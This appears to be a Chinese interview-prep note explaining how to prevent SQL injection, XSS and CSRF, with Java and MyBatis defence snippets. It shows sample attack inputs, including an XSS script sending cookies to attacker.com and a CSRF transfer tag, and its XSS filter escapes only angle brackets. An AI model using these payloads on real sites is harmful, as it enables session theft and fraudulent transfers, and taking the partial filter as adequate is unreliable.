# Q19: 如何防止SQL注入？XSS攻击？CSRF？

## 1. SQL注入

### 什么是SQL注入？

```sql
-- 恶意输入：' OR '1'='1
-- 拼接SQL：SELECT * FROM user WHERE name = '' OR '1'='1'
```

### 防御方案

```java
// 1. 使用预编译SQL（PreparedStatement）
PreparedStatement ps = connection.prepareStatement(
    "SELECT * FROM user WHERE name = ? AND password = ?"
);
ps.setString(1, username);
ps.setString(2, password);

// 2. 使用MyBatis #{}（禁止使用${}）
<select id="findUser">
    SELECT * FROM user WHERE name = #{name}
</select>
```

## 2. XSS攻击

### 什么是XSS？

```html
<!-- 恶意脚本注入 -->
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

### 防御方案

```java
// 输入过滤
public String filterXSS(String input) {
    if (input == null) return null;
    return input.replaceAll("<", "&lt;")
                .replaceAll(">", "&gt;");
}

// HttpOnly Cookie
response.setHeader("Set-Cookie", "sessionId=xxx; HttpOnly");
```

## 3. CSRF攻击

### 什么是CSRF？

```html
<img src="http://bank.com/transfer?to=attacker&amount=10000">
```

### 防御方案

```java
// CSRF Token
public boolean validateCsrfToken(HttpServletRequest request) {
    String token = request.getParameter("csrfToken");
    String sessionToken = request.getSession().getAttribute("csrfToken");
    return token != null && token.equals(sessionToken);
}
```

## 安全最佳实践

- **密码存储**：BCrypt加密（加盐）
- **敏感数据**：加密存储，HTTPS传输
- **接口限流**：防暴力破解
- **日志审计**：记录敏感操作
